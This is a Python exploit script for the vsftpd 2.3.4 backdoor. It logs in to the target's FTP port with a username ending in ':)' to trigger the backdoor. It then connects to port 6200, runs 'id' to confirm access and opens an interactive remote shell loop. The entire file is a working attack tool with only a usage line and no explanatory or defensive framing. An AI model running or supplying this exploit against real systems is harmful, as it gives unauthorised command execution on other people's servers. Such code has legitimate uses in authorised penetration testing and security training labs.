import socket
import sys

if(len(sys.argv) != 2):
	print("python3 vsftpd_2.3.4_exploit.py <host ip>")
	sys.exit(0)
#default port
ftpPort = 21
backdoorPort = 6200

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def openBackdoor():
	try:		
		s.connect((host, ftpPort))
		print("[*] FTP port connected.")
		s.recv(1024)
		#opening backdoor at username appending :)
		s.send("USER hohoho:)\n".encode())
		s.recv(1024)
		s.send("PASS anything\n".encode())
		print("[*] Backdoor opened at port 6200")		
	except:
		print("[!] Unable to connect FTP port.")
		sys.exit(0)

	return True

def shell():
	try:
		backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		backdoor.connect((host, backdoorPort))
		#testing backdoor by sending 'id' command
		backdoor.send("id\n".encode())
		testRsl = backdoor.recv(1024)
		print("[*] Backdoor connected successfully!")
		print(testRsl.decode())

		if(len(testRsl) > 0):
			print("[*] To exit, enter 'exit_shell'")
			while(True):
				cmd = input("[FTP SHELL]$ ")		

				if(cmd != 'exit_shell'):
					cmd = cmd + "\n"
					backdoor.send(cmd.encode())

					#receive all buffers (shell output)
					backdoor.settimeout(0.5)
					fullOutput = ''
					while(True):
						try:
							shellOutput = backdoor.recv(1024)						
							if(len(shellOutput) > 0):								
								fullOutput += shellOutput.decode()
						except:
							print(fullOutput)
							break					
				else:
					print('[*] closing sockets connection.')
					break

			#closing sockets
			backdoor.send("exit\n".encode())
			backdoor.close()		
			s.close()
	except:
		print("[!] ERROR, some weird problem occurs here.")		

if __name__ == '__main__':
	retRsl = openBackdoor()

	if(retRsl == True):
		shell()